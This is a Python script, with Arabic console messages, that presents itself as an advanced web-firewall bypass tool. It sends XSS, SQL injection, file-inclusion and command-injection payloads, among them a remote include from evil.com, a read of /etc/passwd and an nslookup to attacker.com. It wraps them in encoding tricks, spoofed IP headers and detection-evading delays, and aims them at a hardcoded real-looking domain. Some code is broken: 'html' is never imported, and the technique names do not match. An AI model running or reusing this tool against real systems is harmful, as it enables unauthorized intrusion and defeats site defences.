#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة تخطي جدران الحماية المتقدمة (WAF Bypass Advanced)
Advanced Web Application Firewall Bypass Tool
"""

import requests
import random
import time
import base64
import urllib.parse
import json
import re
from datetime import datetime
from fake_useragent import UserAgent

class AdvancedWAFBypass:
    def __init__(self):
        self.ua = UserAgent()
        self.session = requests.Session()
        self.bypass_techniques = {
            'encoding': self.encoding_bypass,
            'case_variation': self.case_variation_bypass,
            'comment_injection': self.comment_injection_bypass,
            'double_encoding': self.double_encoding_bypass,
            'unicode_encoding': self.unicode_encoding_bypass,
            'http_parameter_pollution': self.hpp_bypass,
            'request_method_switch': self.method_switch_bypass,
            'header_manipulation': self.header_manipulation_bypass,
            'path_traversal': self.path_traversal_bypass,
            'null_byte': self.null_byte_bypass,
            'chunked_encoding': self.chunked_encoding_bypass,
            'http2_downgrade': self.http2_downgrade_bypass
        }
        
        self.payloads = {
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<button onclick=alert('XSS')>Click</button>"
            ],
            'sql': [
                "' OR '1'='1",
                "' UNION SELECT null,null,null--",
                "admin'--",
                "1' OR '1'='1",
                "') OR '1'='1--",
                "1' AND (SELECT COUNT(*) FROM users) > 0--",
                "' OR 1=1#",
                "' OR 1=1--",
                "' OR 1=1/*",
                "1' OR 1=1--"
            ],
            'lfi': [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=index.php",
                "expect://id",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "file:///etc/passwd",
                "http://evil.com/shell.txt"
            ],
            'command': [
                "; id",
                "| id",
                "&& id",
                "${id}",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| whoami",
                "&& uname -a",
                "; nslookup attacker.com"
            ]
        }
    
    def get_random_headers(self):
        """Generate random headers for bypassing detection"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'application/json, text/plain, */*',
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            ]),
            'Accept-Language': random.choice(['en-US,en;q=0.5', 'ar-SA,ar;q=0.9,en;q=0.8']),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': random.choice(['keep-alive', 'close']),
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'same-origin']),
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
        return headers
    
    def encoding_bypass(self, payload):
        """URL and HTML encoding bypass"""
        encoded_payloads = [
            urllib.parse.quote(payload),
            urllib.parse.quote_plus(payload),
            html.escape(payload),
            base64.b64encode(payload.encode()).decode(),
            ''.join(f'%{ord(c):02x}' for c in payload),
            ''.join(f'&#x{ord(c):x};' for c in payload)
        ]
        return random.choice(encoded_payloads)
    
    def case_variation_bypass(self, payload):
        """Case variation bypass"""
        variations = [
            payload.upper(),
            payload.lower(),
            payload.capitalize(),
            ''.join(random.choice([c.upper(), c.lower()]) for c in payload),
            payload.swapcase()
        ]
        return random.choice(variations)
    
    def comment_injection_bypass(self, payload):
        """Comment injection bypass"""
        comments = ['/**/', '/*test*/', '/*\n*/', '<!-- -->', '#', '--', ';--']
        comment = random.choice(comments)
        positions = [
            payload + comment,
            comment + payload,
            payload[:len(payload)//2] + comment + payload[len(payload)//2:],
            payload.replace(' ', comment),
            comment + payload + comment
        ]
        return random.choice(positions)
    
    def double_encoding_bypass(self, payload):
        """Double encoding bypass"""
        single_encoded = urllib.parse.quote(payload)
        double_encoded = urllib.parse.quote(single_encoded)
        return double_encoded
    
    def unicode_encoding_bypass(self, payload):
        """Unicode encoding bypass"""
        unicode_payloads = [
            payload.replace('a', '\\u0061').replace('e', '\\u0065').replace('i', '\\u0069'),
            payload.replace('s', '\\u0073').replace('c', '\\u0063').replace('r', '\\u0072'),
            payload.replace('<', '\\u003c').replace('>', '\\u003e').replace('"', '\\u0022'),
            ''.join(f'\\u{ord(c):04x}' for c in payload),
            payload.encode('utf-8').decode('utf-8')
        ]
        return random.choice(unicode_payloads)
    
    def hpp_bypass(self, payload):
        """HTTP Parameter Pollution bypass"""
        param_name = random.choice(['id', 'input', 'file', 'param', 'data'])
        return f"{param_name}=1&{param_name}={payload}&{param_name}=test"
    
    def method_switch_bypass(self, payload):
        """HTTP Method switch bypass"""
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']
        return random.choice(methods), payload
    
    def header_manipulation_bypass(self, payload):
        """Header manipulation bypass"""
        headers = self.get_random_headers()
        bypass_headers = {
            'X-Original-URL': f"/test.php?input={payload}",
            'X-Rewrite-URL': f"/test.php?input={payload}",
            'X-HTTP-Method-Override': 'GET',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': str(len(payload)),
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Host': 'localhost',
            'X-Forwarded-Server': 'localhost'
        }
        headers.update(bypass_headers)
        return headers, payload
    
    def path_traversal_bypass(self, payload):
        """Path traversal bypass"""
        traversals = [
            './',
            '../',
            '..\\',
            '%2e%2e%2f',
            '%252e%252e%252f',
            '..%c0%af',
            '..%c1%9c',
            '....//',
            '....\\\\'
        ]
        traversal = random.choice(traversals)
        return traversal + payload
    
    def null_byte_bypass(self, payload):
        """Null byte bypass"""
        null_bytes = ['%00', '%2500', '%00%00', '\\x00', '\\0']
        null_byte = random.choice(null_bytes)
        return payload + null_byte
    
    def chunked_encoding_bypass(self, payload):
        """Chunked encoding bypass"""
        chunk_size = hex(len(payload))[2:]
        return f"{chunk_size}\\r\\n{payload}\\r\\n0\\r\\n\\r\\n"
    
    def http2_downgrade_bypass(self, payload):
        """HTTP/2 downgrade bypass"""
        return payload, {'HTTP/2': '0'}
    
    def apply_bypass_technique(self, payload, technique):
        """Apply selected bypass technique"""
        if technique in self.bypass_techniques:
            return self.bypass_techniques[technique](payload)
        return payload
    
    def random_delay(self, min_delay=1, max_delay=3):
        """Random delay to avoid detection"""
        delay = random.uniform(min_delay, max_delay)
        time.sleep(delay)
        return delay
    
    def test_waf_bypass(self, url, payload_type='xss', technique='encoding', max_tests=5):
        """Test WAF bypass with multiple techniques"""
        results = []
        
        if payload_type not in self.payloads:
            return results
        
        payloads = self.payloads[payload_type]
        
        print(f"🚀 بدء اختبار تخطي WAF باستخدام تقنية: {technique}")
        print(f"🎯 نوع الحمولة: {payload_type}")
        print(f"🔗 الرابط المستهدف: {url}")
        print("=" * 60)
        
        for i, payload in enumerate(payloads[:max_tests]):
            try:
                # Apply bypass technique
                bypassed_payload = self.apply_bypass_technique(payload, technique)
                
                # Random delay
                delay = self.random_delay()
                
                # Prepare request
                headers = self.get_random_headers()
                method = 'GET'
                
                # Handle special techniques
                if technique == 'method_switch_bypass':
                    method, bypassed_payload = self.bypass_techniques[technique](payload)
                elif technique == 'header_manipulation_bypass':
                    headers, bypassed_payload = self.bypass_techniques[technique](payload)
                
                # Build URL with payload
                if '?' in url:
                    test_url = f"{url}&input={bypassed_payload}"
                else:
                    test_url = f"{url}?input={bypassed_payload}"
                
                # Send request
                response = self.session.request(
                    method=method,
                    url=test_url,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    allow_redirects=False
                )
                
                # Analyze response
                is_bypassed = self.analyze_response(response, payload)
                
                result = {
                    'test_number': i + 1,
                    'technique': technique,
                    'original_payload': payload,
                    'bypassed_payload': bypassed_payload,
                    'method': method,
                    'status_code': response.status_code,
                    'response_length': len(response.content),
                    'is_bypassed': is_bypassed,
                    'delay': delay,
                    'timestamp': datetime.now().isoformat()
                }
                
                results.append(result)
                
                # Print progress
                status_icon = "✅" if is_bypassed else "❌"
                print(f"{status_icon} اختبار {i+1}: الحالة {response.status_code} | تخطي: {is_bypassed} | تأخير: {delay:.2f}s")
                
            except Exception as e:
                print(f"❌ خطأ في الاختبار {i+1}: {str(e)}")
                continue
        
        return results
    
    def analyze_response(self, response, original_payload):
        """Analyze if bypass was successful"""
        # Check for WAF indicators
        waf_indicators = [
            'blocked', 'forbidden', 'security', 'firewall',
            'denied', 'access denied', 'not allowed', 'suspicious'
        ]
        
        response_text = response.text.lower()
        
        # If status code is not blocked (403, 406, etc.)
        if response.status_code not in [403, 406, 409, 501, 503]:
            # Check if payload appears in response (potential XSS)
            if original_payload in response.text:
                return True
            
            # Check for SQL injection indicators
            sql_indicators = ['mysql', 'postgresql', 'sqlite', 'oracle', 'error']
            if any(indicator in response_text for indicator in sql_indicators):
                return True
            
            # Check for command injection indicators
            cmd_indicators = ['uid=', 'gid=', 'groups=', 'whoami', 'root']
            if any(indicator in response_text for indicator in cmd_indicators):
                return True
        
        # Check if WAF blocked the request
        if any(indicator in response_text for indicator in waf_indicators):
            return False
        
        # If response is different from typical blocked response
        if len(response.content) > 1000 and response.status_code == 200:
            return True
        
        return False
    
    def comprehensive_waf_test(self, url, max_tests_per_type=3):
        """Run comprehensive WAF bypass test with all techniques"""
        all_results = []
        
        print(f"🛡️  بدء اختبار شامل لتخطي جدار الحماية")
        print(f"🌐 الهدف: {url}")
        print(f"🔧 التقنيات: {len(self.bypass_techniques)}")
        print("=" * 70)
        
        for payload_type in ['xss', 'sql', 'lfi', 'command']:
            for technique in self.bypass_techniques.keys():
                print(f"\n📋 اختبار {payload_type.upper()} باستخدام {technique}")
                print("-" * 50)
                
                results = self.test_waf_bypass(url, payload_type, technique, max_tests_per_type)
                all_results.extend(results)
                
                # Random delay between techniques
                time.sleep(random.uniform(2, 5))
        
        return all_results
    
    def save_results(self, results, filename=None):
        """Save results to JSON file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"waf_bypass_results_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        
        print(f"💾 تم حفظ النتائج في: {filename}")
        return filename
    
    def generate_report(self, results):
        """Generate comprehensive report"""
        total_tests = len(results)
        successful_bypasses = sum(1 for r in results if r['is_bypassed'])
        blocked_attempts = total_tests - successful_bypasses
        
        # Group by technique and payload type
        by_technique = {}
        by_payload_type = {}
        
        for result in results:
            technique = result['technique']
            payload_type = result['original_payload'][:20] + "..."
            
            if technique not in by_technique:
                by_technique[technique] = {'total': 0, 'bypassed': 0}
            if payload_type not in by_payload_type:
                by_payload_type[payload_type] = {'total': 0, 'bypassed': 0}
            
            by_technique[technique]['total'] += 1
            by_technique[technique]['bypassed'] += 1 if result['is_bypassed'] else 0
            
            by_payload_type[payload_type]['total'] += 1
            by_payload_type[payload_type]['bypassed'] += 1 if result['is_bypassed'] else 0
        
        report = f"""
🛡️ تقرير تخطي جدار الحماية المتقدم
=====================================
📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌐 إجمالي الاختبارات: {total_tests}
✅ ناجحة: {successful_bypasses}
❌ محظورة: {blocked_attempts}
📊 نسبة النجاح: {(successful_bypasses/total_tests*100):.1f}%

📈 حسب تقنية التخطي:
"""
        
        for technique, stats in by_technique.items():
            success_rate = (stats['bypassed'] / stats['total'] * 100)
            report += f"  • {technique}: {stats['bypassed']}/{stats['total']} ({success_rate:.1f}%)\n"
        
        return report

def main():
    """Main function"""
    print("🛡️ أداة تخطي جدار الحماية المتقدمة")
    print("====================================")
    
    # Initialize bypass tool
    waf_bypass = AdvancedWAFBypass()
    
    # Target URL
    target_url = "https://dxp.salam.sa/test.php"
    
    # Run comprehensive test
    results = waf_bypass.comprehensive_waf_test(target_url, max_tests_per_type=2)
    
    # Generate and save report
    report = waf_bypass.generate_report(results)
    print(report)
    
    # Save results
    filename = waf_bypass.save_results(results)
    
    print(f"\n✅ تم إكمال اختبار تخطي جدار الحماية بنجاح!")
    print(f"📁 تم حفظ النتائج في: {filename}")
    print("⚠️  تذكر: استخدم هذه الأداة فقط للاختبار الأمني المصرح به!")

if __name__ == "__main__":
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    main()